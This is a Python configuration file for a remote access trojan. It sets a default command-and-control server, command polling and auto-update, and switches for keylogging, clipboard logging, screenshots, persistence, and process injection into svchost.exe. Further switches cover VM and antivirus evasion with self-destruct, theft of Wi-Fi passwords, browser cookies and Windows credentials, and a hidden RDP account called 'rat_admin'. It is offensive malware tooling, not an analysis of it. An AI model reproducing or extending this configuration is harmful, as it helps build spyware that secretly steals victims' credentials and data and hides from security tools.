import os
import base64
import platform
import hashlib
from dotenv import load_dotenv

# Load environment variables from .env file
load_dotenv()

class Config:
    # ==============================
    # Connection Settings
    # ==============================
    SERVER_URL = os.getenv("SERVER_URL", "https://fasitheme.ir/logger/api.php")
    SECRET_TOKEN = os.getenv("SECRET_TOKEN", "1")
    CHECK_INTERVAL = int(os.getenv("CHECK_INTERVAL", "120"))  # seconds
    COMMAND_POLL_INTERVAL = int(os.getenv("COMMAND_POLL_INTERVAL", "10"))  # seconds
    COMMAND_TIMEOUT = int(os.getenv("COMMAND_TIMEOUT", "30"))  # seconds
    IP_URL = os.getenv("IP_URL", "https://fasitheme.ir/logger/ip.php")
    UPDATE_URL = os.getenv("UPDATE_URL", "https://fasitheme.ir/logger/version.php")

    # ==============================
    # Proxy Settings
    # ==============================
    PROXY_HTTP = os.getenv("PROXY_HTTP", None)
    PROXY_HTTPS = os.getenv("PROXY_HTTPS", None)

    # ==============================
    # Security Settings
    # ==============================
    ENCRYPTION_KEY = base64.b64decode(os.getenv("ENCRYPTION_KEY", "dGVzdF9rZXk="))
    IV_LENGTH = 16
    BUFFER_LIMIT = int(os.getenv("BUFFER_LIMIT", "100000"))
    CLIENT_VERSION = os.getenv("CLIENT_VERSION", "1.0")

    # ==============================
    # Feature Toggles - Core Features
    # ==============================
    ENABLE_KEYLOGGING = os.getenv("ENABLE_KEYLOGGING", "true").lower() == "true"
    ENABLE_SCREENSHOTS = os.getenv("ENABLE_SCREENSHOTS", "true").lower() == "true"
    ENABLE_SYSTEM_INFO = os.getenv("ENABLE_SYSTEM_INFO", "true").lower() == "true"
    ENABLE_PERSISTENCE = os.getenv("ENABLE_PERSISTENCE", "true").lower() == "true"
    ENABLE_COMMAND_HANDLER = os.getenv("ENABLE_COMMAND_HANDLER", "true").lower() == "true"
    ENABLE_AUTO_UPDATE = os.getenv("ENABLE_AUTO_UPDATE", "true").lower() == "true"

    # ==============================
    # Feature Toggles - Advanced Features
    # ==============================
    ENABLE_RDP_CONTROL = os.getenv("ENABLE_RDP_CONTROL", "true").lower() == "true"
    ENABLE_PROCESS_INJECTION = os.getenv("ENABLE_PROCESS_INJECTION", "true").lower() == "true"
    ENABLE_VM_DETECTION = os.getenv("ENABLE_VM_DETECTION", "true").lower() == "true"
    ENABLE_ANTIVIRUS_DETECTION = os.getenv("ENABLE_ANTIVIRUS_DETECTION", "true").lower() == "true"
    ENABLE_FILE_MANAGEMENT = os.getenv("ENABLE_FILE_MANAGEMENT", "true").lower() == "true"
    ENABLE_WIFI_PASSWORD_EXTRACTION = os.getenv("ENABLE_WIFI_PASSWORD_EXTRACTION", "true").lower() == "true"
    ENABLE_BROWSER_DATA_COLLECTION = os.getenv("ENABLE_BROWSER_DATA_COLLECTION", "true").lower() == "true"
    ENABLE_WINDOWS_CREDENTIALS = os.getenv("ENABLE_WINDOWS_CREDENTIALS", "true").lower() == "true"

    # ==============================
    # Feature Settings
    # ==============================
    # Keylogging Settings
    KEYLOGGING_BUFFER_SIZE = int(os.getenv("KEYLOGGING_BUFFER_SIZE", "1000"))
    ENABLE_CLIPBOARD_LOGGING = os.getenv("ENABLE_CLIPBOARD_LOGGING", "true").lower() == "true"
    
    # Screenshot Settings
    SCREENSHOT_INTERVAL = int(os.getenv("SCREENSHOT_INTERVAL", "60"))  # seconds
    SCREENSHOT_QUALITY = int(os.getenv("SCREENSHOT_QUALITY", "85"))  # 1-100
    
    # System Info Settings
    COLLECT_INSTALLED_PROGRAMS = os.getenv("COLLECT_INSTALLED_PROGRAMS", "true").lower() == "true"
    COLLECT_RUNNING_PROCESSES = os.getenv("COLLECT_RUNNING_PROCESSES", "true").lower() == "true"
    COLLECT_NETWORK_INFO = os.getenv("COLLECT_NETWORK_INFO", "true").lower() == "true"
    
    # RDP Settings
    RDP_CREATE_USER = os.getenv("RDP_CREATE_USER", "false").lower() == "true"
    RDP_USERNAME = os.getenv("RDP_USERNAME", "rat_admin")
    RDP_PASSWORD = os.getenv("RDP_PASSWORD", "SecurePass123!@#")
    ENABLE_TAILSCALE = os.getenv("ENABLE_TAILSCALE", "false").lower() == "true"
    
    # Process Injection Settings
    INJECTION_TARGET_PROCESS = os.getenv("INJECTION_TARGET_PROCESS", "svchost.exe")
    INJECTION_METHOD = os.getenv("INJECTION_METHOD", "remote_thread")  # remote_thread, apc, etc.
    
    # VM Detection Settings
    VM_DETECTION_AGGRESSIVE = os.getenv("VM_DETECTION_AGGRESSIVE", "false").lower() == "true"
    VM_SELF_DESTRUCT = os.getenv("VM_SELF_DESTRUCT", "true").lower() == "true"
    
    # Antivirus Settings
    ANTIVIRUS_BEHAVIOR_ADJUSTMENT = os.getenv("ANTIVIRUS_BEHAVIOR_ADJUSTMENT", "true").lower() == "true"
    ENABLE_CODE_OBFUSCATION = os.getenv("ENABLE_CODE_OBFUSCATION", "false").lower() == "true"
    
    # File Management Settings
    MAX_FILE_UPLOAD_SIZE = int(os.getenv("MAX_FILE_UPLOAD_SIZE", "10485760"))  # 10MB
    ALLOWED_FILE_EXTENSIONS = os.getenv("ALLOWED_FILE_EXTENSIONS", "txt,log,doc,docx,pdf").split(",")
    
    # Browser Data Settings
    COLLECT_CHROME_DATA = os.getenv("COLLECT_CHROME_DATA", "true").lower() == "true"
    COLLECT_FIREFOX_DATA = os.getenv("COLLECT_FIREFOX_DATA", "true").lower() == "true"
    COLLECT_EDGE_DATA = os.getenv("COLLECT_EDGE_DATA", "true").lower() == "true"
    COLLECT_HISTORY = os.getenv("COLLECT_HISTORY", "true").lower() == "true"
    COLLECT_COOKIES = os.getenv("COLLECT_COOKIES", "true").lower() == "true"
    COLLECT_PASSWORDS = os.getenv("COLLECT_PASSWORDS", "false").lower() == "true"

    # ==============================
    # System Settings
    # ==============================
    EMERGENCY_HOTKEY = os.getenv("EMERGENCY_HOTKEY", "ctrl+alt+shift+k")
    TAILSCALE_BINARY = os.getenv("TAILSCALE_BINARY", "tailscale.exe")
    TAILSCALE_AUTH_KEY = os.getenv("TAILSCALE_AUTH_KEY", "")
    PRIMARY_DNS = os.getenv("PRIMARY_DNS", "178.22.122.100")
    SECONDARY_DNS = os.getenv("SECONDARY_DNS", "185.51.200.2")

    # ==============================
    # Debug & Safety Settings
    # ==============================
    DEBUG_MODE = os.getenv("DEBUG_MODE", "false").lower() == "true"
    TEST_MODE = os.getenv("TEST_MODE", "false").lower() == "true"
    SELF_DESTRUCT_ON_ERROR = os.getenv("SELF_DESTRUCT_ON_ERROR", "false").lower() == "true"
    ERROR_LOG_FILE = os.getenv("ERROR_LOG_FILE", "errors.log")
    MAX_ERROR_LOG_SIZE = int(os.getenv("MAX_ERROR_LOG_SIZE", "1048576"))  # 1MB

    # File Manager Advanced Settings
    FILE_MANAGER_CHUNK_SIZE = int(os.getenv("FILE_MANAGER_CHUNK_SIZE", "1048576"))  # 1MB
    FILE_MANAGER_MAX_UPLOAD_SIZE = int(os.getenv("FILE_MANAGER_MAX_UPLOAD_SIZE", "104857600"))  # 100MB
    FILE_MANAGER_PAGE_SIZE = int(os.getenv("FILE_MANAGER_PAGE_SIZE", "50"))
    FILE_MANAGER_SHOW_HIDDEN = os.getenv("FILE_MANAGER_SHOW_HIDDEN", "false").lower() == "true"
    FILE_MANAGER_ENABLE_WATCHER = os.getenv("FILE_MANAGER_ENABLE_WATCHER", "true").lower() == "true"
    FILE_MANAGER_ALLOWED_PREVIEW_TYPES = os.getenv("FILE_MANAGER_ALLOWED_PREVIEW_TYPES", "txt,log,json,xml,html,js,css,py,md,csv,ini,cfg").split(",")
    FILE_MANAGER_MAX_SEARCH_TIME = int(os.getenv("FILE_MANAGER_MAX_SEARCH_TIME", "30"))  # seconds

    @staticmethod
    def get_client_id():
        unique_str = f"{platform.node()}-{os.getlogin()}"
        return hashlib.sha256(unique_str.encode()).hexdigest()[:32]

    @staticmethod
    def get_behavior_config():
        """
        Returns a behavior configuration dictionary based on feature toggles
        """
        return {
            # Core Features
            "keylogging_enabled": Config.ENABLE_KEYLOGGING,
            "screenshot_enabled": Config.ENABLE_SCREENSHOTS,
            "system_info_enabled": Config.ENABLE_SYSTEM_INFO,
            "persistence_enabled": Config.ENABLE_PERSISTENCE,
            "command_handler_enabled": Config.ENABLE_COMMAND_HANDLER,
            "auto_update_enabled": Config.ENABLE_AUTO_UPDATE,
            
            # Advanced Features
            "rdp_enabled": Config.ENABLE_RDP_CONTROL,
            "process_injection_enabled": Config.ENABLE_PROCESS_INJECTION,
            "vm_detection_enabled": Config.ENABLE_VM_DETECTION,
            "antivirus_detection_enabled": Config.ENABLE_ANTIVIRUS_DETECTION,
            "file_management_enabled": Config.ENABLE_FILE_MANAGEMENT,
            "wifi_passwords_enabled": Config.ENABLE_WIFI_PASSWORD_EXTRACTION,
            "browser_data_enabled": Config.ENABLE_BROWSER_DATA_COLLECTION,
            
            # Sub-features
            "clipboard_logging_enabled": Config.ENABLE_CLIPBOARD_LOGGING,
            "vm_self_destruct": Config.VM_SELF_DESTRUCT,
            "antivirus_behavior_adjustment": Config.ANTIVIRUS_BEHAVIOR_ADJUSTMENT,
            "code_obfuscation_enabled": Config.ENABLE_CODE_OBFUSCATION,
            "windows_credentials_enabled": Config.ENABLE_WINDOWS_CREDENTIALS,
        }

    @staticmethod
    def validate_config():
        """
        Validate configuration and log warnings for invalid combinations
        """
        import logging
        
        warnings = []
        
        # Check for potentially dangerous combinations
        if Config.ENABLE_PROCESS_INJECTION and not Config.ENABLE_ANTIVIRUS_DETECTION:
            warnings.append("Process injection enabled without antivirus detection - high detection risk")
        
        if Config.ENABLE_RDP_CONTROL and Config.DEBUG_MODE:
            warnings.append("RDP control enabled in debug mode - security risk")
            
        if Config.VM_SELF_DESTRUCT and not Config.ENABLE_VM_DETECTION:
            warnings.append("VM self-destruct enabled without VM detection")
        
        # Log warnings
        for warning in warnings:
            logging.warning(f"Config Warning: {warning}")
        
        return len(warnings) == 0